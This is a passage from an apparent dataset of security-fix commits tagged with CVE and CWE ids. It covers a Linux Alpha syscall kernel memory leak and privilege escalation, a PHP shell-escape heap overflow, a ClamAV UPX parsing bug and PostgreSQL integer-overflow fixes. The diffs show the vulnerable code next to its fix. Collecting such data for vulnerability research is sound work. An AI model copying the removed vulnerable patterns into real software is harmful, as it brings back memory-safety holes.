osf_sysinfo allows copying large amounts of\nkernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy\nsize, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows\nprivilege escalation via writing return value of sys_wait4 to kernel\nmemory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Richard Henderson <rth@twiddle.net>\nCc: Ivan Kokshaysky <ink@jurassic.park.msu.ru>\nCc: Matt Turner <mattst88@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/alpha\/kernel\/osf_sys.c | 11 +++++++----\n 1 file changed, 7 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/arch\/alpha\/kernel\/osf_sys.c b\/arch\/alpha\/kernel\/osf_sys.c\nindex 376f221307919..326f0a2d56e52 100644\n--- a\/arch\/alpha\/kernel\/osf_sys.c\n+++ b\/arch\/alpha\/kernel\/osf_sys.c\n@@ -409,7 +409,7 @@ SYSCALL_DEFINE2(osf_getdomainname, char __user *, name, int, namelen)\n \t\treturn -EFAULT;\n \n \tlen = namelen;\n-\tif (namelen > 32)\n+\tif (len > 32)\n \t\tlen = 32;\n \n \tdown_read(&uts_sem);\n@@ -594,7 +594,7 @@ SYSCALL_DEFINE3(osf_sysinfo, int, command, char __user *, buf, long, count)\n \tdown_read(&uts_sem);\n \tres = sysinfo_table[offset];\n \tlen = strlen(res)+1;\n-\tif (len > count)\n+\tif ((unsigned long)len > (unsigned long)count)\n \t\tlen = count;\n \tif (copy_to_user(buf, res, len))\n \t\terr = -EFAULT;\n@@ -649,7 +649,7 @@ SYSCALL_DEFINE5(osf_getsysinfo, unsigned long, op, void __user *, buffer,\n \t\treturn 1;\n \n \tcase GSI_GET_HWRPB:\n-\t\tif (nbytes < sizeof(*hwrpb))\n+\t\tif (nbytes > sizeof(*hwrpb))\n \t\t\treturn -EINVAL;\n \t\tif (copy_to_user(buffer, hwrpb, nbytes) != 0)\n \t\t\treturn -EFAULT;\n@@ -1008,6 +1008,7 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n {\n \tstruct rusage r;\n \tlong ret, err;\n+\tunsigned int status = 0;\n \tmm_segment_t old_fs;\n \n \tif (!ur)\n@@ -1016,13 +1017,15 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n \told_fs = get_fs();\n \t\t\n \tset_fs (KERNEL_DS);\n-\tret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);\n+\tret = sys_wait4(pid, (unsigned int __user *) &status, options,\n+\t\t\t(struct rusage __user *) &r);\n \tset_fs (old_fs);\n \n \tif (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))\n \t\treturn -EFAULT;\n \n \terr = 0;\n+\terr |= put_user(status, ustatus);\n \terr |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);\n \terr |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);\n \terr |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-1904","CWE_ID":"189","category":"security","commit_id":"2871c70efaaaa0f102557a17c727fd4d5204dd4b","commit_message":"From 2871c70efaaaa0f102557a17c727fd4d5204dd4b Mon Sep 17 00:00:00 2001\nFrom: libnex <emmanuel.law@gmail.com>\nDate: Mon, 4 Jan 2016 12:27:27 +1300\nSubject: [PATCH] Patch for Heap Buffer Overflow in EscapeShell\n\nProposed patch for bug #71270\n---\n ext\/standard\/exec.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/ext\/standard\/exec.c b\/ext\/standard\/exec.c\nindex c724b795357a..c4afce333735 100644\n--- a\/ext\/standard\/exec.c\n+++ b\/ext\/standard\/exec.c\n@@ -253,7 +253,7 @@ PHPAPI zend_string *php_escape_shell_cmd(char *str)\n #endif\n \n \n-\tcmd = zend_string_alloc(2 * l, 0);\n+\tcmd = zend_string_safe_alloc(2, l, 0, 0);\n \n \tfor (x = 0, y = 0; x < l; x++) {\n \t\tint mb_len = php_mblen(str + x, (l - x));\n@@ -345,7 +345,7 @@ PHPAPI zend_string *php_escape_shell_arg(char *str)\n \tsize_t estimate = (4 * l) + 3;\n \n \n-\tcmd = zend_string_alloc(4 * l + 2, 0); \/* worst case *\/\n+\tcmd = zend_string_safe_alloc(4, l, 2, 0); \/* worst case *\/\n \n #ifdef PHP_WIN32\n \tZSTR_VAL(cmd)[y++] = '\"';\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2013-2020","CWE_ID":"189","category":"security","commit_id":"270e368b99e93aa5447d46c797c92c3f9f39f375","commit_message":"From 270e368b99e93aa5447d46c797c92c3f9f39f375 Mon Sep 17 00:00:00 2001\nFrom: David Raynor <draynor@sourcefire.com>\nDate: Fri, 5 Apr 2013 17:36:54 -0400\nSubject: [PATCH] libclamav: bb #7055\n\n---\n NEWS           |  8 ++++----\n README         |  6 ++++++\n libclamav\/pe.c | 20 ++++++++++++++------\n 3 files changed, 24 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex d107a9d519..8f45122c98 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -1,8 +1,8 @@\n-0.97.7\n+0.97.8\n ------\n-ClamAV 0.97.7 addresses several reported potential security bugs.  Thanks to\n-Felix Groebert, Mateusz Jurczyk and Gynvael Coldwind of the Google Security\n-Team for finding and reporting these issues.\n+ClamAV 0.97.8 addresses several reported potential security bugs.  Thanks to\n+Felix Groebert of the Google Security Team for finding and reporting these\n+issues.\n \n --\n The ClamAV team (http:\/\/www.clamav.net\/team)\ndiff --git a\/README b\/README\nindex fe77b335fc..6c04971c5e 100644\n--- a\/README\n+++ b\/README\n@@ -1,6 +1,12 @@\n Note: This README\/NEWS file refers to the source tarball. Some things described\n here may not be available in binary packages.\n --\n+0.97.8\n+------\n+ClamAV 0.97.8 addresses several reported potential security bugs.  Thanks to\n+Felix Groebert of the Google Security Team for finding and reporting these\n+issues.\n+\n 0.97.7\n ------\n ClamAV 0.97.7 addresses several reported potential security bugs.  Thanks to\ndiff --git a\/libclamav\/pe.c b\/libclamav\/pe.c\nindex e0a122e76b..e4a15f02b1 100644\n--- a\/libclamav\/pe.c\n+++ b\/libclamav\/pe.c\n@@ -1868,13 +1868,21 @@ int cli_scanpe(cli_ctx *ctx)\n \n \t    if(epbuff[1] != '\\xbe' || skew <= 0 || skew > 0xfff) { \/* FIXME: legit skews?? *\/\n \t\tskew = 0; \n-\t\tif(upxfn(src, ssize, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep) >= 0)\n-\t\t    upx_success = 1;\n-\n-\t    } else {\n+\t    }\n+\t    else if(skew > ssize) {\n+\t\t\/* Ignore suggested skew larger than section size *\/\n+\t\tcli_dbgmsg(\"UPX: Ignoring bad skew of %d bytes\\n\", skew);\n+\t\tskew = 0;\n+\t    }\n+\t    else {\n \t\tcli_dbgmsg(\"UPX: UPX1 seems skewed by %d bytes\\n\", skew);\n-\t\tif(upxfn(src + skew, ssize - skew, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep-skew) >= 0 || upxfn(src, ssize, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep) >= 0)\n-\t\t    upx_success = 1;\n+\t    }\n+\n+\t    if(upxfn(src + skew, ssize - skew, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep-skew) >= 0 || upxfn(src, ssize, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep) >= 0) {\n+\t\tupx_success = 1;\n+\t    }\n+\t    else if(skew && (upxfn(src, ssize, dest, &dsize, exe_sections[i].rva, exe_sections[i + 1].rva, vep) >= 0)) {\n+\t\tupx_success = 1;\n \t    }\n \n \t    if(upx_success)\n","owner":"vrtadmin","repo":"clamav-devel","source":"cve"},{"CVE_ID":"CVE-2014-0064","CWE_ID":"189","category":"security","commit_id":"31400a673325147e1205326008e32135a78b4d8a","commit_message":"From 31400a673325147e1205326008e32135a78b4d8a Mon Sep 17 00:00:00 2001\nFrom: Noah Misch <noah@leadboat.com>\nDate: Mon, 17 Feb 2014 09:33:31 -0500\nSubject: [PATCH] Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064\n---\n contrib\/hstore\/hstore.h              | 15 ++++++++++---\n contrib\/hstore\/hstore_io.c           | 21 ++++++++++++++++++\n contrib\/hstore\/hstore_op.c           | 15 +++++++++++++\n contrib\/intarray\/_int.h              |  2 ++\n contrib\/intarray\/_int_bool.c         |  9 ++++++++\n contrib\/ltree\/ltree.h                |  3 +++\n contrib\/ltree\/ltree_io.c             | 11 ++++++++++\n contrib\/ltree\/ltxtquery_io.c         | 13 ++++++++++-\n src\/backend\/utils\/adt\/geo_ops.c      | 30 ++++++++++++++++++++++++--\n src\/backend\/utils\/adt\/tsquery.c      |  7 +++++-\n src\/backend\/utils\/adt\/tsquery_util.c |  5 +++++\n src\/backend\/utils\/adt\/txid.c         | 23 +++++++++++---------\n src\/backend\/utils\/adt\/varbit.c       | 32 ++++++++++++++++++++++++++--\n src\/include\/tsearch\/ts_type.h        |  3 +++\n src\/include\/utils\/varbit.h           |  7 ++++++\n 15 files changed, 177 insertions(+), 19 deletions(-)\n\n","diff_code":"diff --git a\/contrib\/hstore\/hstore.h b\/contrib\/hstore\/hstore.h\nindex 23c8a6f0e288..37e46118531a 100644\n--- a\/contrib\/hstore\/hstore.h\n+++ b\/contrib\/hstore\/hstore.h\n@@ -49,9 +49,12 @@ typedef struct\n } HStore;\n \n \/*\n- * it's not possible to get more than 2^28 items into an hstore,\n- * so we reserve the top few bits of the size field. See hstore_compat.c\n- * for one reason why.\tSome bits are left for future use here.\n+ * It's not possible to get more than 2^28 items into an hstore, so we reserve\n+ * the top few bits of the size field.  See hstore_compat.c for one reason\n+ * why.  Some bits are left for future use here.  MaxAllocSize makes the\n+ * practical count limit slightly more than 2^28 \/ 3, or INT_MAX \/ 24, the\n+ * limit for an hstore full of 4-byte keys and null values.  Therefore, we\n+ * don't explicitly check the format-imposed limit.\n  *\/\n #define HS_FLAG_NEWVERSION 0x80000000\n \n@@ -59,6 +62,12 @@ typedef struct\n #define HS_SETCOUNT(hsp_,c_) ((hsp_)->size_ = (c_) | HS_FLAG_NEWVERSION)\n \n \n+\/*\n+ * \"x\" comes from an existing HS_COUNT() (as discussed, <= INT_MAX\/24) or a\n+ * Pairs array length (due to MaxAllocSize, <= INT_MAX\/40).  \"lenstr\" is no\n+ * more than INT_MAX, that extreme case arising in hstore_from_arrays().\n+ * Therefore, this calculation is limited to about INT_MAX \/ 5 + INT_MAX.\n+ *\/\n #define HSHRDSIZE\t(sizeof(HStore))\n #define CALCDATASIZE(x, lenstr) ( (x) * 2 * sizeof(HEntry) + HSHRDSIZE + (lenstr) )\n \ndiff --git a\/contrib\/hstore\/hstore_io.c b\/contrib\/hstore\/hstore_io.c\nindex 973a1265c1d4..6dd3f7c24eb6 100644\n--- a\/contrib\/hstore\/hstore_io.c\n+++ b\/contrib\/hstore\/hstore_io.c\n@@ -13,6 +13,7 @@\n #include \"utils\/builtins.h\"\n #include \"utils\/json.h\"\n #include \"utils\/lsyscache.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/typcache.h\"\n \n #include \"hstore.h\"\n@@ -439,6 +440,11 @@ hstore_recv(PG_FUNCTION_ARGS)\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n+\tif (pcount < 0 || pcount > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t pcount, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n \tpairs = palloc(pcount * sizeof(Pairs));\n \n \tfor (i = 0; i < pcount; ++i)\n@@ -554,6 +560,13 @@ hstore_from_arrays(PG_FUNCTION_ARGS)\n \t\t\t\t\t  TEXTOID, -1, false, 'i',\n \t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n \n+\t\/* see discussion in hstoreArrayToPairs() *\/\n+\tif (key_count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t key_count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \t\/* value_array might be NULL *\/\n \n \tif (PG_ARGISNULL(1))\n@@ -676,6 +689,13 @@ hstore_from_array(PG_FUNCTION_ARGS)\n \n \tcount = in_count \/ 2;\n \n+\t\/* see discussion in hstoreArrayToPairs() *\/\n+\tif (count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \tpairs = palloc(count * sizeof(Pairs));\n \n \tfor (i = 0; i < count; ++i)\n@@ -807,6 +827,7 @@ hstore_from_record(PG_FUNCTION_ARGS)\n \t\tmy_extra->ncolumns = ncolumns;\n \t}\n \n+\tAssert(ncolumns <= MaxTupleAttributeNumber);\t\t\/* thus, no overflow *\/\n \tpairs = palloc(ncolumns * sizeof(Pairs));\n \n \tif (rec)\ndiff --git a\/contrib\/hstore\/hstore_op.c b\/contrib\/hstore\/hstore_op.c\nindex 45edb048ceb7..8ba7a05a6593 100644\n--- a\/contrib\/hstore\/hstore_op.c\n+++ b\/contrib\/hstore\/hstore_op.c\n@@ -8,6 +8,7 @@\n #include \"catalog\/pg_type.h\"\n #include \"funcapi.h\"\n #include \"utils\/builtins.h\"\n+#include \"utils\/memutils.h\"\n \n #include \"hstore.h\"\n \n@@ -90,6 +91,19 @@ hstoreArrayToPairs(ArrayType *a, int *npairs)\n \t\treturn NULL;\n \t}\n \n+\t\/*\n+\t * A text array uses at least eight bytes per element, so any overflow in\n+\t * \"key_count * sizeof(Pairs)\" is small enough for palloc() to catch.\n+\t * However, credible improvements to the array format could invalidate\n+\t * that assumption.  Therefore, use an explicit check rather than relying\n+\t * on palloc() to complain.\n+\t *\/\n+\tif (key_count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t key_count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \tkey_pairs = palloc(sizeof(Pairs) * key_count);\n \n \tfor (i = 0, j = 0; i < key_count; i++)\n@@ -648,6 +662,7 @@ hstore_slice_to_hstore(PG_FUNCTION_ARGS)\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n+\t\/* hstoreArrayToPairs() checked overflow *\/\n \tout_pairs = palloc(sizeof(Pairs) * nkeys);\n \tbufsiz = 0;\n \ndiff --git a\/contrib\/intarray\/_int.h b\/contrib\/intarray\/_int.h\nindex 56aa23cfde0d..7f93206e890b 100644\n--- a\/contrib\/intarray\/_int.h\n+++ b\/contrib\/intarray\/_int.h\n@@ -5,6 +5,7 @@\n #define ___INT_H__\n \n #include \"utils\/array.h\"\n+#include \"utils\/memutils.h\"\n \n \/* number ranges for compression *\/\n #define MAXNUMRANGE 100\n@@ -137,6 +138,7 @@ typedef struct QUERYTYPE\n \n #define HDRSIZEQT\toffsetof(QUERYTYPE, items)\n #define COMPUTESIZE(size)\t( HDRSIZEQT + (size) * sizeof(ITEM) )\n+#define QUERYTYPEMAXITEMS\t((MaxAllocSize - HDRSIZEQT) \/ sizeof(ITEM))\n #define GETQUERY(x)  ( (x)->items )\n \n \/* \"type\" codes for ITEM *\/\ndiff --git a\/contrib\/intarray\/_int_bool.c b\/contrib\/intarray\/_int_bool.c\nindex d0572afc1e34..b18e997748be 100644\n--- a\/contrib\/intarray\/_int_bool.c\n+++ b\/contrib\/intarray\/_int_bool.c\n@@ -448,6 +448,9 @@ boolop(PG_FUNCTION_ARGS)\n static void\n findoprnd(ITEM *ptr, int32 *pos)\n {\n+\t\/* since this function recurses, it could be driven to stack overflow. *\/\n+\tcheck_stack_depth();\n+\n #ifdef BS_DEBUG\n \telog(DEBUG3, (ptr[*pos].type == OPR) ?\n \t\t \"%d  %c\" : \"%d  %d\", *pos, ptr[*pos].val);\n@@ -508,7 +511,13 @@ bqarr_in(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n \t\t\t\t errmsg(\"empty query\")));\n \n+\tif (state.num > QUERYTYPEMAXITEMS)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\terrmsg(\"number of query items (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t   state.num, (int) QUERYTYPEMAXITEMS)));\n \tcommonlen = COMPUTESIZE(state.num);\n+\n \tquery = (QUERYTYPE *) palloc(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = state.num;\ndiff --git a\/contrib\/ltree\/ltree.h b\/contrib\/ltree\/ltree.h\nindex 563970a67a45..1b1305b48393 100644\n--- a\/contrib\/ltree\/ltree.h\n+++ b\/contrib\/ltree\/ltree.h\n@@ -5,6 +5,7 @@\n \n #include \"fmgr.h\"\n #include \"tsearch\/ts_locale.h\"\n+#include \"utils\/memutils.h\"\n \n typedef struct\n {\n@@ -111,6 +112,8 @@ typedef struct\n \n #define HDRSIZEQT\t\tMAXALIGN(VARHDRSZ + sizeof(int32))\n #define COMPUTESIZE(size,lenofoperand)\t( HDRSIZEQT + (size) * sizeof(ITEM) + (lenofoperand) )\n+#define LTXTQUERY_TOO_BIG(size,lenofoperand) \\\n+\t((size) > (MaxAllocSize - HDRSIZEQT - (lenofoperand)) \/ sizeof(ITEM))\n #define GETQUERY(x)  (ITEM*)( (char*)(x)+HDRSIZEQT )\n #define GETOPERAND(x)\t( (char*)GETQUERY(x) + ((ltxtquery*)x)->size * sizeof(ITEM) )\n \ndiff --git a\/contrib\/ltree\/ltree_io.c b\/contrib\/ltree\/ltree_io.c\nindex 3e88b81c16e3..d64debb5f49b 100644\n--- a\/contrib\/ltree\/ltree_io.c\n+++ b\/contrib\/ltree\/ltree_io.c\n@@ -8,6 +8,7 @@\n #include <ctype.h>\n \n #include \"ltree.h\"\n+#include \"utils\/memutils.h\"\n #include \"crc32.h\"\n \n PG_FUNCTION_INFO_V1(ltree_in);\n@@ -64,6 +65,11 @@ ltree_in(PG_FUNCTION_ARGS)\n \t\tptr += charlen;\n \t}\n \n+\tif (num + 1 > MaxAllocSize \/ sizeof(nodeitem))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t errmsg(\"number of levels (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\tnum + 1, (int) (MaxAllocSize \/ sizeof(nodeitem)))));\n \tlist = lptr = (nodeitem *) palloc(sizeof(nodeitem) * (num + 1));\n \tptr = buf;\n \twhile (*ptr)\n@@ -228,6 +234,11 @@ lquery_in(PG_FUNCTION_ARGS)\n \t}\n \n \tnum++;\n+\tif (num > MaxAllocSize \/ ITEMSIZE)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t errmsg(\"number of levels (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\tnum, (int) (MaxAllocSize \/ ITEMSIZE))));\n \tcurqlevel = tmpql = (lquery_level *) palloc0(ITEMSIZE * num);\n \tptr = buf;\n \twhile (*ptr)\ndiff --git a\/contrib\/ltree\/ltxtquery_io.c b\/contrib\/ltree\/ltxtquery_io.c\nindex 583ff2aaebbb..982186581a3a 100644\n--- a\/contrib\/ltree\/ltxtquery_io.c\n+++ b\/contrib\/ltree\/ltxtquery_io.c\n@@ -9,6 +9,7 @@\n \n #include \"crc32.h\"\n #include \"ltree.h\"\n+#include \"miscadmin.h\"\n \n PG_FUNCTION_INFO_V1(ltxtq_in);\n Datum\t\tltxtq_in(PG_FUNCTION_ARGS);\n@@ -212,6 +213,9 @@ makepol(QPRS_STATE *state)\n \tint32\t\tlenstack = 0;\n \tuint16\t\tflag = 0;\n \n+\t\/* since this function recurses, it could be driven to stack overflow *\/\n+\tcheck_stack_depth();\n+\n \twhile ((type = gettoken_query(state, &val, &lenval, &strval, &flag)) != END)\n \t{\n \t\tswitch (type)\n@@ -276,6 +280,9 @@ makepol(QPRS_STATE *state)\n static void\n findoprnd(ITEM *ptr, int32 *pos)\n {\n+\t\/* since this function recurses, it could be driven to stack overflow. *\/\n+\tcheck_stack_depth();\n+\n \tif (ptr[*pos].type == VAL || ptr[*pos].type == VALTRUE)\n \t{\n \t\tptr[*pos].left = 0;\n@@ -340,8 +347,12 @@ queryin(char *buf)\n \t\t\t\t errmsg(\"syntax error\"),\n \t\t\t\t errdetail(\"Empty query.\")));\n \n-\t\/* make finish struct *\/\n+\tif (LTXTQUERY_TOO_BIG(state.num, state.sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"ltxtquery is too large\")));\n \tcommonlen = COMPUTESIZE(state.num, state.sumlen);\n+\n \tquery = (ltxtquery *) palloc(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = state.num;\ndiff --git a\/src\/backend\/utils\/adt\/geo_ops.c b\/src\/backend\/utils\/adt\/geo_ops.c\nindex 0a68be66ef00..f267920649a4 100644\n--- a\/src\/backend\/utils\/adt\/geo_ops.c\n+++ b\/src\/backend\/utils\/adt\/geo_ops.c\n@@ -1366,6 +1366,7 @@ path_in(PG_FUNCTION_ARGS)\n \tchar\t   *s;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n+\tint\t\t\tbase_size;\n \tint\t\t\tdepth = 0;\n \n \tif ((npts = pair_count(str, ',')) <= 0)\n@@ -1384,7 +1385,15 @@ path_in(PG_FUNCTION_ARGS)\n \t\tdepth++;\n \t}\n \n-\tsize = offsetof(PATH, p[0]) +sizeof(path->p[0]) * npts;\n+\tbase_size = sizeof(path->p[0]) * npts;\n+\tsize = offsetof(PATH, p[0]) + base_size;\n+\n+\t\/* Check for integer overflow *\/\n+\tif (base_size \/ npts != sizeof(path->p[0]) || size <= base_size)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"too many points requested\")));\n+\n \tpath = (PATH *) palloc(size);\n \n \tSET_VARSIZE(path, size);\n@@ -3429,6 +3438,7 @@ poly_in(PG_FUNCTION_ARGS)\n \tPOLYGON    *poly;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n+\tint\t\t\tbase_size;\n \tint\t\t\tisopen;\n \tchar\t   *s;\n \n@@ -3437,7 +3447,15 @@ poly_in(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n \t\t\t  errmsg(\"invalid input syntax for type polygon: \\\"%s\\\"\", str)));\n \n-\tsize = offsetof(POLYGON, p[0]) +sizeof(poly->p[0]) * npts;\n+\tbase_size = sizeof(poly->p[0]) * npts;\n+\tsize = offsetof(POLYGON, p[0]) + base_size;\n+\n+\t\/* Check for integer overflow *\/\n+\tif (base_size \/ npts != sizeof(poly->p[0]) || size <= base_size)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"too many points requested\")));\n+\n \tpoly = (POLYGON *) palloc0(size);\t\/* zero any holes *\/\n \n \tSET_VARSIZE(poly, size);\n@@ -4343,6 +4361,10 @@ path_poly(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n \t\t\t\t errmsg(\"open path cannot be converted to polygon\")));\n \n+\t\/*\n+\t * Never overflows: the old size fit in MaxAllocSize, and the new size is\n+\t * just a small constant larger.\n+\t *\/\n \tsize = offsetof(POLYGON, p[0]) +sizeof(poly->p[0]) * path->npts;\n \tpoly = (POLYGON *) palloc(size);\n \n@@ -4448,6 +4470,10 @@ poly_path(PG_FUNCTION_ARGS)\n \tint\t\t\tsize;\n \tint\t\t\ti;\n \n+\t\/*\n+\t * Never overflows: the old size fit in MaxAllocSize, and the new size is\n+\t * smaller by a small constant.\n+\t *\/\n \tsize = offsetof(PATH, p[0]) +sizeof(path->p[0]) * poly->npts;\n \tpath = (PATH *) palloc(size);\n \ndiff --git a\/src\/backend\/utils\/adt\/tsquery.c b\/src\/backend\/utils\/adt\/tsquery.c\nindex 90ca37b0f773..b973a534ddb0 100644\n--- a\/src\/backend\/utils\/adt\/tsquery.c\n+++ b\/src\/backend\/utils\/adt\/tsquery.c\n@@ -514,8 +514,13 @@ parse_tsquery(char *buf,\n \t\treturn query;\n \t}\n \n-\t\/* Pack the QueryItems in the final TSQuery struct to return to caller *\/\n+\tif (TSQUERY_TOO_BIG(list_length(state.polstr), state.sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"tsquery is too large\")));\n \tcommonlen = COMPUTESIZE(list_length(state.polstr), state.sumlen);\n+\n+\t\/* Pack the QueryItems in the final TSQuery struct to return to caller *\/\n \tquery = (TSQuery) palloc0(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = list_length(state.polstr);\ndiff --git a\/src\/backend\/utils\/adt\/tsquery_util.c b\/src\/backend\/utils\/adt\/tsquery_util.c\nindex 34587980c75a..8a41fbc531ad 100644\n--- a\/src\/backend\/utils\/adt\/tsquery_util.c\n+++ b\/src\/backend\/utils\/adt\/tsquery_util.c\n@@ -333,6 +333,11 @@ QTN2QT(QTNode *in)\n \tQTN2QTState state;\n \n \tcntsize(in, &sumlen, &nnode);\n+\n+\tif (TSQUERY_TOO_BIG(nnode, sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"tsquery is too large\")));\n \tlen = COMPUTESIZE(nnode, sumlen);\n \n \tout = (TSQuery) palloc0(len);\ndiff --git a\/src\/backend\/utils\/adt\/txid.c b\/src\/backend\/utils\/adt\/txid.c\nindex 56d599f07d71..a005e676b5e9 100644\n--- a\/src\/backend\/utils\/adt\/txid.c\n+++ b\/src\/backend\/utils\/adt\/txid.c\n@@ -26,7 +26,9 @@\n #include \"funcapi.h\"\n #include \"miscadmin.h\"\n #include \"libpq\/pqformat.h\"\n+#include \"postmaster\/postmaster.h\"\n #include \"utils\/builtins.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/snapmgr.h\"\n \n \n@@ -66,6 +68,8 @@ typedef struct\n \n #define TXID_SNAPSHOT_SIZE(nxip) \\\n \t(offsetof(TxidSnapshot, xip) + sizeof(txid) * (nxip))\n+#define TXID_SNAPSHOT_MAX_NXIP \\\n+\t((MaxAllocSize - offsetof(TxidSnapshot, xip)) \/ sizeof(txid))\n \n \/*\n  * Epoch values from xact.c\n@@ -368,6 +372,13 @@ txid_current_snapshot(PG_FUNCTION_ARGS)\n \n \tload_xid_epoch(&state);\n \n+\t\/*\n+\t * Compile-time limits on the procarray (MAX_BACKENDS processes plus\n+\t * MAX_BACKENDS prepared transactions) guarantee nxip won't be too large.\n+\t *\/\n+\tStaticAssertStmt(MAX_BACKENDS * 2 <= TXID_SNAPSHOT_MAX_NXIP,\n+\t\t\t\t\t \"possible overflow in txid_current_snapshot()\");\n+\n \t\/* allocate *\/\n \tnxip = cur->xcnt;\n \tsize = TXID_SNAPSHOT_SIZE(nxip);\n@@ -445,20 +456,12 @@ txid_snapshot_recv(PG_FUNCTION_ARGS)\n \ttxid\t\tlast = 0;\n \tint\t\t\tnxip;\n \tint\t\t\ti;\n-\tint\t\t\tavail;\n-\tint\t\t\texpect;\n \ttxid\t\txmin,\n \t\t\t\txmax;\n \n-\t\/*\n-\t * load nxip and check for nonsense.\n-\t *\n-\t * (nxip > avail) check is against int overflows in 'expect'.\n-\t *\/\n+\t\/* load and validate nxip *\/\n \tnxip = pq_getmsgint(buf, 4);\n-\tavail = buf->len - buf->cursor;\n-\texpect = 8 + 8 + nxip * 8;\n-\tif (nxip < 0 || nxip > avail || expect > avail)\n+\tif (nxip < 0 || nxip > TXID_SNAPSHOT_MAX_NXIP)\n \t\tgoto bad_format;\n \n \txmin = pq_getmsgint64(buf);\ndiff --git 